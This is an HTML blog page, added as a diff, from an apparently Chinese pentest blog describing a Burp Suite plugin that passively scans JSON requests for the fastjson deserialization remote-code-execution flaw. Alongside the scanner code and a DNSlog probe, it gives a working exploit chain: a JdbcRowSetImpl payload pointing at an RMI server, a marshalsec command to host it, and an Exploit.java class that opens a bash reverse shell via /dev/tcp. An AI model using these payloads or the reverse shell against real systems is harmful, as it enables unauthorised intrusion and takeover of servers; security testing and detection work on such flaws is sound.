@@ -1,0 +1,577 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>fastjson被动扫描Burp插件 | 😊#</title>
+  <meta name="author" content="JKme">
+  
+  <meta name="description" content="2019/08/13 Update.
+
+代码没有考虑到json里面套json的情况。
+代码没有考虑到在使用x-www-form-urlencoded的参数是json的情况。这两个加上去之后感觉每个请求的时间都会增加，先挖坑。
+
+2019/08/02 Update:
+
+之前的代码太的太烂，去掉了不用的代码
+增加了hash验证，如果已经请求过的URL第二次就不检测了，需建立/var/tmp/hash.txt文件（自己看着改吧)
+如果不熟悉，就看官方文档，文档，文档。
+
+main.py
+
+#&amp;#x2F;usr&amp;#x2F;bin&amp;#x2F;env python
+#! -*- coding:utf-8 -*-
+
+from burp import IBurpExtender # 定义插件的基本信息类
+from burp import IHttpListener # http流量监听类
+from burp import IRequestInfo
+from noauth import noauth_request
+import hashlib
+
+class BurpExtender(IBurpExtender, IHttpListener):
+    def registerExtenderCallbacks(self, callbacks):
+        self._callbacks &amp;#x3D; callbacks
+        self._helpers &amp;#x3D; callbacks.getHelpers() # 通用函数
+        self._callbacks.setExtensionName(&amp;quot;fastjson_scan&amp;quot;)
+        print &amp;quot;load fastjson_scan plugin success!&amp;quot;
+        print &amp;quot;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;quot;
+        # register ourselves as an HTTP listener
+        callbacks.registerHttpListener(self)
+    
+    def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):
+        if toolFlag &amp;#x3D;&amp;#x3D; 4 or toolFlag &amp;#x3D;&amp;#x3D; 64 or toolFlag &amp;#x3D;&amp;#x3D; 16 or toolFlag &amp;#x3D;&amp;#x3D; 32:
+            if  messageIsRequest:
+                request &amp;#x3D; messageInfo.getRequest()
+                analyzedRequest &amp;#x3D; self._helpers.analyzeRequest(request)
+                contype &amp;#x3D; analyzedRequest.getContentType()  #get Content-type, 这里看官方文档
+                url &amp;#x3D; str(messageInfo.getUrl())
+                with open(&amp;#39;&amp;#x2F;var&amp;#x2F;tmp&amp;#x2F;hash.txt&amp;#39;) as f:
+                    lines &amp;#x3D; f.read().splitlines()
+                m &amp;#x3D; hashlib.md5()
+                m.update(url)
+                print url
+                if contype &amp;#x3D;&amp;#x3D; 4 and m.hexdigest() not in lines:    #是的，json的时候type等于4
+                    with open(&amp;#39;&amp;#x2F;var&amp;#x2F;tmp&amp;#x2F;hash.txt&amp;#39;,&amp;#39;a+&amp;#39;) as f:
+                        f.write(m.hexdigest()+&amp;quot;\n&amp;quot;)
+                    print &amp;quot;[Info]Check url is: %s&amp;quot; % url
+                    cur &amp;#x3D; noauth_request(url)
+                    noauth_result &amp;#x3D; cur.run()
+                    if noauth_result: 
+                        print &amp;quot;[Critical] Found it is a Fastjson RCE %s&amp;quot; % noauth_result[0]
+                    print &amp;quot;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;quot;
+                    print &amp;quot;&amp;quot;
+                else:
+                    pass
+
+
+fastjson在1.2.47以下，包括1.2.47存在反序列化导致的远程命令执行，payload:
+&amp;#123;&amp;quot;@type&amp;quot;:&amp;quot;java.lang.Class&amp;quot;,&amp;quot;val&amp;quot;:&amp;quot;com.sun.rowset.JdbcRowSetImpl&amp;quot;&amp;#125;,&amp;quot;f&amp;quot;:&amp;#123;&amp;quot;@type&amp;quot;:&amp;quot;com.sun.rowset.JdbcRowSetImpl&amp;quot;,&amp;quot;dataSourceName&amp;quot;:&amp;quot;rmi:&amp;#x2F;&amp;#x2F;ip:8000&amp;#x2F;Exploit&amp;quot;,&amp;quot;autoCommit&amp;quot;:true&amp;#125;&amp;#125;
+
+然后在远程主机开启rmi服务和Exploit.classweb服务就可以打了。
+java -cp target&amp;#x2F;marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http:&amp;#x2F;&amp;#x2F;ip:8888&amp;#x2F;#Exploit 8000"> 
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="fastjson被动扫描Burp插件"/>
+  <meta property="og:site_name" content="😊#"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+  <link rel="stylesheet" href="/css/prism-atom-dark.css" media="screen" type="text/css">
+    <link rel="stylesheet" href="/css/prism-line-numbers.css" media="screen" type="text/css">
+  <script src="/js/jquery-2.0.3.min.js"></script>
+<!--   <script src="/js/highlight.min.js"></script>
+  <script>hljs.highlightAll();</script>
+  <link rel="stylesheet" href="/css/highlight/styles/atom-one-dark.min.css" media="screen" type="text/css"> -->
+
+  <!-- analytics -->
+  
+
+
+
+
+<meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="😊#" type="application/atom+xml">
+</head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">😊#</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class=""></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/project" title="All the categories.">
+			  <i class=""></i>Projects
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/atom.xml" title="Subscribe me.">
+			  <i class="fa fa-rss"></i>RSS
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> fastjson被动扫描Burp插件</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <p>2019/08/13 Update.</p>
+<ol>
+<li>代码没有考虑到json里面套json的情况。</li>
+<li>代码没有考虑到在使用x-www-form-urlencoded的参数是json的情况。<br>这两个加上去之后感觉每个请求的时间都会增加，先挖坑。</li>
+</ol>
+<p>2019/08/02 Update:</p>
+<ol>
+<li>之前的代码太的太烂，去掉了不用的代码</li>
+<li>增加了hash验证，如果已经请求过的URL第二次就不检测了，需建立<code>/var/tmp/hash.txt</code>文件（自己看着改吧)</li>
+<li>如果不熟悉，就看官方文档，文档，文档。</li>
+</ol>
+<pre class="line-numbers language-none"><code class="language-none">main.py
+
+#&#x2F;usr&#x2F;bin&#x2F;env python
+#! -*- coding:utf-8 -*-
+
+from burp import IBurpExtender # 定义插件的基本信息类
+from burp import IHttpListener # http流量监听类
+from burp import IRequestInfo
+from noauth import noauth_request
+import hashlib
+
+class BurpExtender(IBurpExtender, IHttpListener):
+    def registerExtenderCallbacks(self, callbacks):
+        self._callbacks &#x3D; callbacks
+        self._helpers &#x3D; callbacks.getHelpers() # 通用函数
+        self._callbacks.setExtensionName(&quot;fastjson_scan&quot;)
+        print &quot;load fastjson_scan plugin success!&quot;
+        print &quot;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&quot;
+        # register ourselves as an HTTP listener
+        callbacks.registerHttpListener(self)
+    
+    def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):
+        if toolFlag &#x3D;&#x3D; 4 or toolFlag &#x3D;&#x3D; 64 or toolFlag &#x3D;&#x3D; 16 or toolFlag &#x3D;&#x3D; 32:
+            if  messageIsRequest:
+                request &#x3D; messageInfo.getRequest()
+                analyzedRequest &#x3D; self._helpers.analyzeRequest(request)
+                contype &#x3D; analyzedRequest.getContentType()  #get Content-type, 这里看官方文档
+                url &#x3D; str(messageInfo.getUrl())
+                with open(&#39;&#x2F;var&#x2F;tmp&#x2F;hash.txt&#39;) as f:
+                    lines &#x3D; f.read().splitlines()
+                m &#x3D; hashlib.md5()
+                m.update(url)
+                print url
+                if contype &#x3D;&#x3D; 4 and m.hexdigest() not in lines:    #是的，json的时候type等于4
+                    with open(&#39;&#x2F;var&#x2F;tmp&#x2F;hash.txt&#39;,&#39;a+&#39;) as f:
+                        f.write(m.hexdigest()+&quot;\n&quot;)
+                    print &quot;[Info]Check url is: %s&quot; % url
+                    cur &#x3D; noauth_request(url)
+                    noauth_result &#x3D; cur.run()
+                    if noauth_result: 
+                        print &quot;[Critical] Found it is a Fastjson RCE %s&quot; % noauth_result[0]
+                    print &quot;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&quot;
+                    print &quot;&quot;
+                else:
+                    pass<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<hr>
+<p>fastjson在<code>1.2.47</code>以下，包括1.2.47存在反序列化导致的远程命令执行，payload:</p>
+<pre class="line-numbers language-none"><code class="language-none">&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;&#125;,&quot;f&quot;:&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi:&#x2F;&#x2F;ip:8000&#x2F;Exploit&quot;,&quot;autoCommit&quot;:true&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>然后在远程主机开启rmi服务和<code>Exploit.class</code>web服务就可以打了。</p>
+<pre class="line-numbers language-none"><code class="language-none">java -cp target&#x2F;marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http:&#x2F;&#x2F;ip:8888&#x2F;#Exploit 8000<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">Exploit.java
+javac Exploit.java  &#x2F;&#x2F;编译为class
+java Exploit  &#x2F;&#x2F;运行测试
+然后用python的http模块起一个web服务就可用。
+
+public class Exploit &#123;
+    public Exploit()&#123;
+        try &#123;
+            &#x2F;&#x2F; Runtime.getRuntime().exec(&quot;calc&quot;);
+            java.lang.Runtime.getRuntime().exec(
+                    new String[]&#123;&quot;bash&quot;, &quot;-c&quot;, &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;4545 0&gt;&amp;1&quot;&#125;);
+        &#125; catch(Exception e)&#123;
+            e.printStackTrace();
+        &#125;
+    &#125;
+    public static void main(String[] argv)&#123;
+        Exploit e &#x3D; new Exploit();
+    &#125;
+&#125;
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>首先你要有一个可以打的接口，这就很蛋疼了。想了半天找了lufei写的一个xxescanner，想了下可以修改为自己的检测工具，但是到最后没成功。</p>
+<p>java不熟悉只能转向自己熟悉的python，最后综合了下终于写出来了。</p>
+<p>###DNSlog</p>
+<p>因为使用新的payload打了存在fastjson漏洞的应用之后，老的payload就可以打了 :)<br>从小密圈里面找到了一份POC</p>
+<pre class="line-numbers language-none"><code class="language-none">&#123;&quot;name&quot;:&#123;&quot;@type&quot;:&quot;java.net.InetAddress&quot;,&quot;val&quot;:&quot;baidu.com&quot;&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>可以利用dnslog，根据val更换为自己的服务器，辣么久可以了。这个poc在1.2.48之后就不能用了，简直是绝佳的POC。<br>dnslog要用bit4改之后的那个。</p>
+<p>思路就是请求自己的解析，然后根据接口去检测是否有对应的解析:</p>
+<pre class="line-numbers language-none"><code class="language-none">&#123;&quot;name&quot;:&#123;&quot;@type&quot;:&quot;java.net.InetAddress&quot;,&quot;val&quot;:&quot;test.baidu.com&quot;&#125;&#125;
+http:&#x2F;&#x2F;127.0.0.1:8000&#x2F;apiquery&#x2F;dns&#x2F;test&#x2F;a2f78f403d7b8b92ca3486bb4dc0e498&#x2F;
+&#x2F;&#x2F;查询是否有test的解析<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>实际中可以生成一串随机字符串，然后去请求是否有对应的解析:</p>
+<pre class="line-numbers language-none"><code class="language-none">def genRandom(self):
+    letters &#x3D; string.ascii_lowercase
+    s &#x3D; &#39;&#39;.join(random.sample(letters, 10))
+    payload &#x3D; hashlib.md5(s + str(time.time())).hexdigest()
+    return payload<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>两个步骤:</p>
+<ol>
+<li>检测到请求中是否有json格式的请求，这里可以根据<code>Content-Type</code>（可能不准确)，检测之后，构造body，打POC</li>
+<li>然后再去检测自己的dnslog是否存在相应的记录</li>
+</ol>
+<p>###不足<br>requests是同步请求，所以如果你的dnslog服务器放在太平洋那边，你的burp会让你怀疑人生，加nginx反代，加cdn。</p>
+<p>MD终于弄完了。</p>
+<pre class="line-numbers language-none"><code class="language-none">main.py
+
+#&#x2F;usr&#x2F;bin&#x2F;env python
+#! -*- coding:utf-8 -*-
+import re
+from burp import IBurpExtender # 定义插件的基本信息类
+from burp import IHttpListener # http流量监听类
+from noauth import noauth_request
+
+res_host &#x3D; re.compile(r&#39;Host: ([^,]*)&#39;)
+res_path &#x3D; re.compile(r&#39;POST ([^ ]*) HTTP&#x2F;&#39;)
+class BurpExtender(IBurpExtender, IHttpListener):
+    def registerExtenderCallbacks(self, callbacks):
+        self._callbacks &#x3D; callbacks
+        self._helpers &#x3D; callbacks.getHelpers() # 通用函数
+        self._callbacks.setExtensionName(&quot;fastjson_scan&quot;)
+        print &quot;load fastjson_scan plugin success!&quot;
+        print &quot;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&quot;
+        # register ourselves as an HTTP listener
+        callbacks.registerHttpListener(self)
+    
+    def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):
+        if toolFlag &#x3D;&#x3D; 4 or toolFlag &#x3D;&#x3D; 64 or toolFlag &#x3D;&#x3D; 16 or toolFlag &#x3D;&#x3D; 32:
+            if not messageIsRequest:
+                response &#x3D; messageInfo.getResponse() # get response
+                analyzedResponse &#x3D; self._helpers.analyzeResponse(response)
+                body &#x3D; response[analyzedResponse.getBodyOffset():] 
+                body_string &#x3D; body.tostring() # get response_body
+                request &#x3D; messageInfo.getRequest()
+                analyzedRequest &#x3D; self._helpers.analyzeResponse(request)
+                request_header &#x3D; analyzedRequest.getHeaders()
+                # print request_header[0]
+                # print request_header
+                header_string &#x3D; &#39;&#39;.join(request_header)
+                # print header_string
+                # try:
+                #     method,path &#x3D; res_path.findall(request_header[0])[0]
+                #     host &#x3D; res_host.findall(request_header[1])[0]
+                #     print flag_json
+                #     url &#x3D; method+&quot; &quot;+host+path
+                # except:
+                #     url &#x3D; &quot;&quot;
+                # if method&#x3D;&#x3D;&quot;POST&quot; and flag_json:
+                if r&quot;application&#x2F;json&quot; in header_string:
+                    # 检测GET请求的接口
+
+                    # print path
+                    # print host
+                    try:
+                        path &#x3D; res_path.findall(request_header[0])[0]
+                        host &#x3D; res_host.findall(request_header[1])[0]
+                        target &#x3D; host + path
+                    except:
+                        target &#x3D; &#39;&#39;
+                    print &quot;[Info]Check url is:&quot; + host + path
+                    cur &#x3D; noauth_request(host,path)
+                    noauth_result &#x3D; cur.run()
+                    if noauth_result: 
+                        print &quot;[Critical] Found it is a Fastjson RCE %s&quot; % noauth_result[0]
+                    print &quot;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&quot;
+                    print &quot;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">noauth.py
+
+#!&#x2F;usr&#x2F;bin&#x2F;env python
+#! -*- coding:utf-8 -*-
+import requests
+import random
+import string
+import hashlib
+import time
+
+headers&#x3D;&#123;
+    
+    &quot;User-Agent&quot;:&quot;Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;66.0.3359.139 Safari&#x2F;537.36&quot;,
+    &quot;Accept-Language&quot;:&quot;zh-CN,zh;q&#x3D;0.9,en;q&#x3D;0.8,mt;q&#x3D;0.7,zh-TW;q&#x3D;0.6&quot;,
+    &quot;Accept-Encoding&quot;:&quot;gzip, deflate&quot;,
+    &quot;Accept&quot;:&quot;text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8&quot;
+&#125;
+
+headers2 &#x3D; &#123;
+
+	&quot;User-Agent&quot;: &quot;Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;66.0.3359.139 Safari&#x2F;537.36&quot;,
+	&quot;Accept-Language&quot;: &quot;zh-CN,zh;q&#x3D;0.9,en;q&#x3D;0.8,mt;q&#x3D;0.7,zh-TW;q&#x3D;0.6&quot;,
+	&quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;,
+	&quot;Accept&quot;: &quot;*&quot;,
+	&quot;Content-Type&quot;: &quot;application&#x2F;json&quot;
+&#125;
+class noauth_request(object):
+    # 未授权访问漏洞检测
+    def __init__(self,host,path):
+        self.url &#x3D; &quot;http:&#x2F;&#x2F;&quot;+host+path
+        self.randomStr &#x3D; &#39;&#39;
+
+    def run(self):
+        return_list &#x3D; []
+        self.randomStr &#x3D; self.genRandom()
+        if self.verify():
+            return_list.append(self.url)
+        return return_list
+
+
+    def verify(self):
+        payload &#x3D; &#39;&#123;&quot;name&quot;:&#123;&quot;@type&quot;:&quot;java.net.InetAddress&quot;,&quot;val&quot;:&quot;&#39; + self.randomStr + &#39;&lt;domain&gt;&quot;&#125;&#125;&#39;
+        # print payload
+        try:
+            res &#x3D; requests.post(url&#x3D;self.url, data&#x3D;payload, timeout&#x3D;20, headers&#x3D;headers2, verify&#x3D;False)
+        except Exception, e:
+            print str(e)
+
+        poc_url &#x3D; &quot;http:&#x2F;&#x2F;&lt;domain&gt;&#x2F;apiquery&#x2F;dns&#x2F;&quot; + self.randomStr  + &quot;&#x2F;&lt;token&gt;&#x2F;&quot;
+        # print poc_url
+        try:
+            req &#x3D; requests.get(poc_url, headers&#x3D;headers)
+            if self.randomStr in req.content:
+                return True
+        except Exception,e:
+            print str(e)
+        return False
+
+    def genRandom(self):
+        letters &#x3D; string.ascii_lowercase
+        s &#x3D; &#39;&#39;.join(random.sample(letters, 10))
+        payload &#x3D; hashlib.md5(s + str(time.time())).hexdigest()
+        return payload
+
+
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>这个文章很精彩呀，所以被删除了啊</p>
+<p><img src="./images/fastjson1.png"></p>
+<ul>
+<li><a target="_blank" rel="noopener" href="http://xdxd.love/2015/04/20/burpsuite%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91%E4%B9%8Bpython%E7%AF%87/">http://xdxd.love/2015/04/20/burpsuite%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91%E4%B9%8Bpython%E7%AF%87/</a></li>
+<li><a target="_blank" rel="noopener" href="https://thief.one/2018/05/04/1/">https://thief.one/2018/05/04/1/</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/BugScanTeam/DNSLog">https://github.com/BugScanTeam/DNSLog</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/lufeirider/Project.git">https://github.com/lufeirider/Project.git</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/bit4woo/DNSLog">https://github.com/bit4woo/DNSLog</a></li>
+</ul>
+
+	  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+
+	</div>
+
+	
+	<span id="/2019/07/22/fastjson-rce.html" class="leancloud-visitors view" data-flag-title="fastjson被动扫描Burp插件">
+		<em class="post-meta-item-text"> Page View </em> <i class="leancloud-visitors-count"></i>
+	</span>
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a href="/2019/09/17/nginx_path_traversle.html" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2019/07/21/rsyslog-backdoor.html" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2019-07-22 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/Pentest/">Pentest<span>42</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
+	   <div id="toc" class="toc collapse in">
+		   <span class="toc-title">Contents</span>
+			
+		</div>
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2022 JKme's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
